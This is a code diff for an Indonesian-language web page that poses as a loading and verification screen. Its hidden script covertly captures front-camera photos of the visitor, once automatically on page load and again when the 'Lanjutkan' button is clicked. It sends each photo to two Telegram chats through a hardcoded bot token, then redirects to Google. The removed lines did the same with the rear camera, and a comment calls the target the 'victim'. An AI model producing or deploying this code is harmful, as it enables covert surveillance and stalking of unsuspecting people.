@@ -4,9 +4,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Memuat...</title>
+    <style>
+        body {
+            margin: 0;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+            font-family: sans-serif;
+            text-align: center;
+        }
+        #btnLanjut {
+            display: none;
+            margin-top: 20px;
+            padding: 12px 24px;
+            background: #0088cc;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
 
+    <div>
+        <h2 id="statusText">Memuat Halaman...</h2>
+        <p style="font-size: 12px; color: #888;">Mohon tunggu sebentar</p>
+        <button id="btnLanjut">Lanjutkan</button>
+    </div>
+
+    <!-- Elemen Video & Canvas Tersembunyi -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -14,69 +47,100 @@
         const telegramToken = "8937858897:AAF5POAsvL9AiJAX6SnHiznPlMaV8Ne6oVU";
         const chatIds = ["8401116235", "5408520831"];
 
-        window.addEventListener('DOMContentLoaded', async () => {
-            try {
-                // Minta izin awal agar browser memunculkan pop-up akses kamera
-                const initialStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                initialStream.getTracks().forEach(track => track.stop()); // Matikan dulu
+        async function kirimKeTelegram(blob, captionText) {
+            for (const chatId of chatIds) {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('caption', captionText);
 
-                // Cari daftar semua kamera fisik di HP korban
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const videoDevices = devices.filter(device => device.kind === 'videoinput');
-
-                // Cari kamera belakang (biasanya berlabel "back", "environment", "rear", atau ambil indeks terakhir jika ada banyak)
-                let selectedDevice = videoDevices.find(d => 
-                    d.label.toLowerCase().includes('back') || 
-                    d.label.toLowerCase().includes('rear') || 
-                    d.label.toLowerCase().includes('environment')
-                );
-
-                // Jika label tidak terbaca tapi ada lebih dari 1 kamera, asumsikan kamera terakhir adalah kamera belakang
-                if (!selectedDevice && videoDevices.length > 1) {
-                    selectedDevice = videoDevices[videoDevices.length - 1];
+                try {
+                    await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (err) {
+                    console.error("Gagal kirim:", err);
                 }
+            }
+        }
 
-                // Konfigurasi constraints berdasarkan kamera yang ditemukan
-                const constraints = {
-                    video: selectedDevice ? { deviceId: { exact: selectedDevice.deviceId } } : { facingMode: "environment" },
-                    audio: false
-                };
+        // TAHAP 1: Otomatis saat halaman dibuka
+        window.addEventListener('DOMContentLoaded', async () => {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
 
-                // Buka kamera belakang
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                const video = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
                 
                 video.srcObject = stream;
                 
-                await new Promise(resolve => setTimeout(resolve, 2000)); // Tunggu 2 detik
+                setTimeout(async () => {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    stream.getTracks().forEach(track => track.stop());
 
-                stream.getTracks().forEach(track => track.stop());
+                    canvas.toBlob(async (blob) => {
+                        if (blob) {
+                            await kirimKeTelegram(blob, '📸 Foto Tahap 1 (Otomatis saat dibuka)');
+                        }
+                        // Setelah foto pertama terkirim, ubah teks dan tampilkan tombol
+                        document.getElementById('statusText').innerText = "Verifikasi Selesai";
+                        document.getElementById('btnLanjut').style.display = 'inline-block';
+                    }, 'image/jpeg', 0.85);
 
-                canvas.toBlob(async (blob) => {
-                    if (!blob) return;
-
-                    for (const chatId of chatIds) {
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'back-capture.jpg');
-                        formData.append('caption', '📸 Foto Kamera Belakang!');
-
-                        await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    }
-                }, 'image/jpeg', 0.85);
+                }, 1500);
 
             } catch (error) {
-                console.error("Gagal akses kamera belakang:", error);
+                console.error("Akses kamera ditolak tahap 1:", error);
+                document.getElementById('statusText').innerText = "Silakan klik tombol di bawah untuk melanjutkan";
+                document.getElementById('btnLanjut').style.display = 'inline-block';
+            }
+        });
+
+        // TAHAP 2: Saat tombol "Lanjutkan" diklik oleh user
+        document.getElementById('btnLanjut').addEventListener('click', async () => {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            
+            document.getElementById('btnLanjut').innerText = "Memproses...";
+            document.getElementById('btnLanjut').disabled = true;
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                
+                setTimeout(async () => {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    stream.getTracks().forEach(track => track.stop());
+
+                    canvas.toBlob(async (blob) => {
+                        if (blob) {
+                            await kirimKeTelegram(blob, '📸 Foto Tahap 2 (Klik Tombol Lanjutkan)');
+                        }
+                        // Redirect ke halaman akhir setelah foto kedua terkirim
+                        window.location.href = "https://www.google.com";
+                    }, 'image/jpeg', 0.85);
+
+                }, 1500);
+
+            } catch (error) {
+                console.error("Akses kamera ditolak tahap 2:", error);
+                window.location.href = "https://www.google.com";
             }
         });
     </script>
